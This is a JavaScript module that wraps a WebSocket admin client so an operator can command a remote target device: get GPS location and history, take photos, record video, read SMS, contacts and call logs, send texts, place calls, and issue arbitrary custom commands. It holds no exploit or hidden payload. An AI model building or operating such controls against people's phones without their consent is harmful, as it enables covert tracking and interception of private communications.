'use strict';

const { adminClient } = require('./websocket');
const config = require('./backend.config');

/**
 * Backend API service that provides high-level methods for device commands.
 * Uses the WebSocket admin client for real-time communication.
 */
class BackendApiService {
  constructor(wsClient) {
    this._client = wsClient;
  }

  /**
   * Initialize the connection to the backend server.
   * @returns {Promise<void>}
   */
  async connect() {
    return this._client.connect();
  }

  /**
   * Disconnect from the backend server.
   */
  disconnect() {
    this._client.disconnect();
  }

  /**
   * Check if connected to the backend.
   * @returns {boolean}
   */
  isConnected() {
    return this._client.isConnected();
  }

  /**
   * Get connection status info.
   * @returns {object}
   */
  getStatus() {
    return {
      connected: this._client.isConnected(),
      serverUrl: config.adminWsUrl,
      targetDevice: config.targetDeviceId,
    };
  }

  /**
   * Subscribe to backend events.
   * @param {string} event - Event name
   * @param {function} handler - Event handler
   */
  on(event, handler) {
    this._client.on(event, handler);
  }

  /**
   * Unsubscribe from backend events.
   * @param {string} event - Event name
   * @param {function} handler - Event handler
   */
  off(event, handler) {
    this._client.off(event, handler);
  }

  // =====================
  // GPS Commands
  // =====================

  /**
   * Request current GPS location from device.
   * @returns {Promise<{lat: number, lng: number, accuracy?: number, timestamp?: number}>}
   */
  async getGps() {
    const response = await this._client.sendCommand('get_gps', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Request GPS tracking history from device.
   * @param {object} options - Options like { limit, since }
   * @returns {Promise<Array>}
   */
  async getGpsTrack(options = {}) {
    const response = await this._client.sendCommand('get_gps_track', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.track || response.data || [];
  }

  // =====================
  // Camera Commands
  // =====================

  /**
   * Take a photo using device camera.
   * @param {object} options - Options like { camera: 'front'|'back', quality }
   * @returns {Promise<{image?: string, url?: string}>}
   */
  async takePhoto(options = {}) {
    const response = await this._client.sendCommand('take_photo', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Get list of available cameras on device.
   * @returns {Promise<Array>}
   */
  async getCameras() {
    const response = await this._client.sendCommand('get_cameras', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.cameras || response.data || [];
  }

  /**
   * Start video recording on device.
   * @param {object} options - Options like { camera, duration }
   * @returns {Promise<object>}
   */
  async startRecording(options = {}) {
    const response = await this._client.sendCommand('start_recording', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Stop video recording on device.
   * @returns {Promise<object>}
   */
  async stopRecording() {
    const response = await this._client.sendCommand('stop_recording', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  // =====================
  // SMS Commands
  // =====================

  /**
   * Get SMS messages from device.
   * @param {object} options - Options like { limit, since, threadId }
   * @returns {Promise<Array>}
   */
  async getMessages(options = {}) {
    const response = await this._client.sendCommand('get_messages', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.messages || response.data || [];
  }

  /**
   * Get contacts from device.
   * @returns {Promise<Array>}
   */
  async getContacts() {
    const response = await this._client.sendCommand('get_contacts', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.contacts || response.data || [];
  }

  /**
   * Send SMS from device.
   * @param {string|string[]} to - Phone number(s) to send to
   * @param {string} message - Message content
   * @returns {Promise<object>}
   */
  async sendSms(to, message) {
    const numbers = Array.isArray(to) ? to : [to];
    const response = await this._client.sendCommand('send_sms', {
      to: numbers,
      message,
    });
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || { sent: true };
  }

  // =====================
  // Call Commands
  // =====================

  /**
   * Make a phone call from device.
   * @param {string} number - Phone number to call
   * @returns {Promise<object>}
   */
  async makeCall(number) {
    const response = await this._client.sendCommand('make_call', { number });
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Get call log from device.
   * @param {object} options - Options like { limit, since }
   * @returns {Promise<Array>}
   */
  async getCallLog(options = {}) {
    const response = await this._client.sendCommand('get_call_log', options);
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data?.calls || response.data || [];
  }

  // =====================
  // Device Info Commands
  // =====================

  /**
   * Get device information.
   * @returns {Promise<object>}
   */
  async getDeviceInfo() {
    const response = await this._client.sendCommand('get_device_info', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  /**
   * Get device battery status.
   * @returns {Promise<{level: number, charging: boolean}>}
   */
  async getBatteryStatus() {
    const response = await this._client.sendCommand('get_battery', {});
    if (response.queued) {
      return { queued: true, message: response.message };
    }
    return response.data || {};
  }

  // =====================
  // Generic Command
  // =====================

  /**
   * Send a custom command to the device.
   * @param {string} action - Command action name
   * @param {object} payload - Command payload
   * @param {string} [deviceId] - Target device ID (optional)
   * @returns {Promise<object>}
   */
  async sendCommand(action, payload = {}, deviceId = null) {
    return this._client.sendCommand(action, payload, deviceId);
  }
}

// Create singleton instance
const backendApi = new BackendApiService(adminClient);

module.exports = {
  BackendApiService,
  backendApi,
};
